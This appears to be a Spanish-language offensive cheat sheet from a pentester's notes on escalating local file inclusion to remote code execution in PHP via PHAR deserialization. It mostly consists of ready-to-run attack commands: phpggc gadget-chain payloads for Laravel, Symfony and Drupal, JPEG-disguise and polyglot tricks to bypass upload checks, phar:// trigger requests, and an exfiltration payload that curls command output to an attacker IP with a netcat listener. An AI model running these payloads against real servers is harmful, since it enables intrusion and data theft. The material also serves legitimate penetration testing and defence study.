---
aliases: null
tags:
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[File Inclusion]]'
---
# LFI To RCE - Phar Deserialization

***

## Cheatsheet

| **Payload / Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `phpggc Laravel/RCE1 system 'id' -p phar -o evil.phar` | Genera PHAR con gadget chain de Laravel → RCE | Backend Laravel detected. |
| `phpggc Symfony/RCE1 system 'id' -p phar -o evil.phar` | Variante Symfony | Symfony backend. |
| `phpggc Drupal/RCE1 system 'id' -p phar -o evil.phar` | Variante Drupal | Drupal backend. |
| `phpggc -l \| grep -i RCE` | Lista todas las gadget chains de RCE disponibles | Recon de framework. |
| `mv evil.phar evil.jpg && curl -F 'file=@evil.jpg' https://target/upload` | PHAR disfrazado como JPEG | Whitelist .jpg. |
| `curl 'https://target/?page=phar:///var/www/uploads/evil.jpg&cmd=id'` | Triggerea deserialización del metadata | LFI confirmado. |
| `phpggc --phar tar Laravel/RCE1 system 'id' -o evil.tar` | PHAR en formato TAR (sin signature) | Detection bypass. |
| `phpggc --phar zip Laravel/RCE1 system 'id' -o evil.zip` | PHAR en formato ZIP | Detection bypass alt. |
| `file_exists('phar:///path/evil.phar')` (trigger en código backend) | Cualquier función filesystem dispara deserialización | App con LFI parcial — solo necesita ruta phar://. |
| `curl 'https://target/?page=phar:///var/www/uploads/evil.jpg/x'` (path arbitrario after phar:) | Trigger sin nombre real de archivo interno | El path post-phar:// no necesita existir. |
| Combo polyglot: imagen JPEG válida + PHAR válido | Pasa whitelist + magic bytes + getimagesize | Whitelist strict + LFI separado. |
^lfi-deserialization

### Workflow básico Laravel

```bash
# 1. Setup phpggc
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# 2. Identificar framework víctima
curl -sI https://target | grep -i 'x-powered-by'
curl -s https://target | grep -iE 'laravel|symfony|drupal'

# 3. Listar chains aplicables
./phpggc -l | grep -i Laravel
# Output: Laravel/RCE1, Laravel/RCE2, Laravel/RCE3, ...

# 4. Generar PHAR malicioso
./phpggc Laravel/RCE1 system 'curl YOUR_IP:8000/$(id|base64)' -p phar -o evil.phar

# 5. Disfrazar como imagen (whitelist bypass)
mv evil.phar evil.jpg
# Verificar que sigue siendo PHAR válido
file evil.jpg  # → POSIX tar archive  o  Zip archive  según formato

# 6. Subir
curl -F 'file=@evil.jpg' https://target/upload

# 7. Triggerear via LFI con wrapper phar://
nc -lvnp 8000 &
curl 'https://target/?page=phar:///var/www/uploads/evil.jpg'
# La función include/file_exists/is_dir abre el PHAR
# PHP automáticamente deserializa el metadata
# Gadget chain ejecuta system('curl YOUR_IP:8000/...')
```

### Workflow polyglot JPEG + PHAR

Cuando el upload valida `getimagesize()` strict:

```bash
# 1. Crear stub PHAR
./phpggc Laravel/RCE1 system 'id' -p phar -o evil.phar

# 2. Polyglot — concatenar JPEG válido + PHAR
# JPEG ends with FFD9 (EOI marker)
# PHAR stub puede ir AL FINAL del JPEG (PHP busca el stub anywhere)
cat legit.jpg evil.phar > polyglot.jpg

# 3. Verificar que es JPEG válido
file polyglot.jpg  # → JPEG image data
identify polyglot.jpg  # ImageMagick OK

# 4. Upload + trigger
curl -F 'file=@polyglot.jpg' https://target/upload
curl 'https://target/?page=phar:///var/www/uploads/polyglot.jpg'
```

### Triggers que disparan deserialización (sin necesitar `include`)

Cualquier función filesystem PHP que reciba `phar://` la deserializa:
- `file_exists()`, `is_file()`, `is_dir()`, `is_readable()`, `filesize()`, `filetype()`, `filemtime()`
- `file_get_contents()`, `readfile()`, `fopen()`, `file()`
- `copy()`, `unlink()`, `rename()`
- `stat()`, `lstat()`

→ LFI no necesita ser `include()`, basta con cualquier check de existencia.

### Limitaciones modernas

- **PHP 8.0+** — `phar.readonly=On` por default → escritura bloqueada, **read sigue triggereando deserialización**.
- **PHP 8.0+** — algunas gadget chains de phpggc rotas. `phpggc -l --new-only` filtra las compatibles.
- **`disable_classes` agresivo** — bloquea instanciación de gadgets.

___

## Overview

Archivos **PHAR** (PHP Archive) contienen metadata serializada (objeto PHP) en la cabecera. Cuando PHP procesa un path `phar://...`, **automáticamente deserializa la metadata** vía `unserialize()`.

Si la app tiene clases con métodos `__wakeup`/`__destruct`/`__toString` que terminan en `system()`/`exec()` (gadget chain), el atacante logra RCE solo por loggear el archivo PHAR.

**Pre-requisitos:**
1. Upload de archivo (cualquier ext, incluso `.jpg`).
2. LFI o cualquier código backend que acepte `phar://` path.
3. Gadget chain disponible — framework conocido (`phpggc`) o custom (analizar código fuente).

**Por qué es severo:**
- Funciona aunque `allow_url_include=Off`.
- Funciona aunque la app valide imagen strict (polyglot).
- Trigger no requiere `include()` — basta `file_exists()`.

[phpggc repo](https://github.com/ambionics/phpggc) — generador de chains para frameworks populares.

***
